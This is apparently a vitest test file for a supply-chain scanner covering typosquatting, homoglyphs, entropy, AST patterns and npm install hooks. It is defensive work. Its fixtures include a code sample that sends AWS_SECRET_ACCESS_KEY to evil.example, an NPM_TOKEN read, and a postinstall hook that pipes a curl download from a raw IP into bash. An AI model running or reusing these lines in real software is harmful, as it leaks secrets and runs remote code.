import { describe, expect, it } from 'vitest';
import { levenshtein } from './levenshtein';
import { shannonEntropy, findHighEntropyTokens } from './entropy';
import { detectHomoglyphs } from './homoglyph';
import { detectTyposquat } from './typosquat';
import { scanSource } from './ast-scan';
import { inspectInstallScripts, hasInstallLifecycle } from './install-scripts';

describe('levenshtein', () => {
  it('computes edit distance', () => {
    expect(levenshtein('requests', 'reqeusts')).toBe(2);
    expect(levenshtein('kitten', 'sitting')).toBe(3);
    expect(levenshtein('same', 'same')).toBe(0);
  });
  it('early-exits past max', () => {
    expect(levenshtein('abc', 'xyz', 1)).toBe(2); // max + 1
  });
});

describe('shannonEntropy', () => {
  it('is 0 for uniform input and log2(n) for n equiprobable symbols', () => {
    expect(shannonEntropy('aaaa')).toBe(0);
    expect(shannonEntropy('aabb')).toBe(1);
    expect(shannonEntropy('abcd')).toBe(2);
  });
  it('flags a high-entropy base64-like blob', () => {
    const blob = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; // 64 distinct
    expect(shannonEntropy(blob)).toBe(6);
    const hits = findHighEntropyTokens(`const payload = "${blob}";`);
    expect(hits).toHaveLength(1);
    expect(hits[0]?.entropy).toBeGreaterThan(5);
  });
});

describe('detectHomoglyphs', () => {
  it('passes a normal ASCII name', () => {
    expect(detectHomoglyphs('react').suspicious).toBe(false);
  });
  it('flags a mixed-script (Cyrillic) lookalike', () => {
    const result = detectHomoglyphs('reаct'); // Cyrillic 'а'
    expect(result.suspicious).toBe(true);
    expect(result.scripts).toEqual(expect.arrayContaining(['Latin', 'Cyrillic']));
  });
});

describe('detectTyposquat', () => {
  const popular = ['requests', 'express', 'lodash'];
  it('flags a near-miss of a popular name', () => {
    expect(detectTyposquat('reqeusts', popular)).toEqual({
      suspicious: true,
      target: 'requests',
      distance: 2,
    });
  });
  it('never flags the popular package itself', () => {
    expect(detectTyposquat('requests', popular).suspicious).toBe(false);
  });
  it('does not flag a clearly different name', () => {
    expect(detectTyposquat('my-app-utils', popular).suspicious).toBe(false);
  });

  it('does not flag legitimate short names that coincidentally sit distance 2 away', () => {
    // Real packages that a naive distance-2 check false-positives on.
    const targets = ['cors', 'chalk', 'jest', 'knex', 'pino'];
    for (const name of ['acorn', 'chai', 'jsesc', 'teex']) {
      expect(detectTyposquat(name, targets).suspicious).toBe(false);
    }
  });

  it('still flags a distance-1 typo of a short-ish name', () => {
    expect(detectTyposquat('expres', ['express']).suspicious).toBe(true);
  });
});

describe('scanSource (AST)', () => {
  it('detects dangerous constructs structurally', () => {
    const code = `
      const cp = require('child_process');
      cp.exec('whoami');
      eval(atob('...'));
      const key = process.env.AWS_SECRET_ACCESS_KEY;
      fetch('http://evil.example/collect?k=' + key);
    `;
    const kinds = scanSource(code).map((s) => s.kind);
    expect(kinds).toContain('child-process');
    expect(kinds).toContain('dynamic-eval');
    expect(kinds).toContain('env-access');
    expect(kinds).toContain('network');
  });
  it('detects dangerous modules pulled in via ESM, not just require', () => {
    // Modern malware uses `import`, not `require` — every form must be caught.
    expect(scanSource("import { exec } from 'child_process';").map((s) => s.kind)).toContain(
      'child-process',
    );
    expect(scanSource("import cp from 'node:child_process';").map((s) => s.kind)).toContain(
      'child-process',
    );
    expect(scanSource("export { spawn } from 'child_process';").map((s) => s.kind)).toContain(
      'child-process',
    );
    expect(scanSource("export * from 'node:net';").map((s) => s.kind)).toContain('network');
    expect(scanSource("import https from 'https';").map((s) => s.kind)).toContain('network');
  });
  it('detects dynamic import() of a dangerous module', () => {
    const kinds = scanSource("const cp = await import('child_process');").map((s) => s.kind);
    expect(kinds).toContain('child-process');
  });
  it('detects obfuscated computed env access (process["env"])', () => {
    const kinds = scanSource('const t = process["env"]["NPM_TOKEN"];').map((s) => s.kind);
    expect(kinds).toContain('env-access');
  });
  it('returns nothing for benign code', () => {
    expect(scanSource('export const add = (a, b) => a + b;')).toEqual([]);
    // A safe ESM import must not be mistaken for a dangerous one.
    expect(scanSource("import { readFile } from 'node:fs/promises';")).toEqual([]);
  });
});

describe('inspectInstallScripts', () => {
  it('flags a download-and-execute postinstall hook', () => {
    const signals = inspectInstallScripts({ postinstall: 'curl http://1.2.3.4/x.sh | bash' });
    expect(signals).toHaveLength(1);
    expect(signals[0]?.script).toBe('postinstall');
    expect(signals[0]?.reasons).toEqual(
      expect.arrayContaining([
        'downloads remote content (curl/wget)',
        'pipes downloaded content into a shell',
        'contacts a raw IP address',
      ]),
    );
  });
  it('ignores non-lifecycle scripts and benign hooks', () => {
    expect(inspectInstallScripts({ build: 'tsc', test: 'vitest' })).toEqual([]);
    expect(inspectInstallScripts({ postinstall: 'node-gyp rebuild' })).toEqual([]);
    expect(hasInstallLifecycle({ postinstall: 'node-gyp rebuild' })).toBe(true);
  });
});
